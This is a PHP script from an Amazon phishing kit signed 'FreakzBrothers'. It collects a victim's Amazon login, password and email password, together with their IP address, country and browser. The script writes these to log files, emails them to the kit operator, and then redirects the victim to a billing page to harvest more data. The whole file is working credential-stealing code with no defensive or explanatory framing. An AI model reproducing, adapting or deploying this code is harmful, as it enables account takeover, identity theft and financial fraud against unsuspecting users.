<?php


session_start();
$randomnumber = rand(1, 100);

include('../__CONFIG__.php');
require('../detect.php');
if (isset($_POST['epass'])) {

	$_SESSION['EM'] = $_POST['EM'];
	$_SESSION['PW'] = $_POST['PW'];
	$_SESSION['epass'] = $_POST['epass'];

	$message =
		"[+] ========. [ ❤️ FreakzBrothers ❤️ ] .======= [+]

----------------Account Amazon--------------------
Account          : " . $_SESSION['EM'] . "
Password         : " . $_SESSION['PW'] . "
Email Password   : " . $_SESSION['epass'] . "
--------------------PC Info-----------------------
IP               : " . $ip . " | " . $nama_negara . "
Browser          : " . $_SERVER['HTTP_USER_AGENT'] . "
[+] ========. [ ❤️ Time is Money ❤️ ] .====== [+]
";
	$file2 = "../../log/tembus-email.txt";
	$isi  = @file_get_contents($file2);
	$buka = fopen($file2, "w");
	fwrite($buka, $isi + 1);
	fclose($buka);
	    $save = fopen("../../log/backup_tembus-emel.txt", "a+");
    fwrite($save, $message);
    fclose($save);
	$headers = "From: ❤ EMAIL ACCESS ❤  <amazon4-$randomnumber@freakzbrothers.team>";
	$subject = "Login: " . $_SESSION['EM'] . " - " . $ip . " - " . $nama_negara . " - " . $countryname . " - " . $contin_name . "";
	mail($to, $subject, $message, $headers);
	header('Location: ../Acc_Billing.php?udm_cat_path=' . sha1(time()));
} else {
	# code...
}
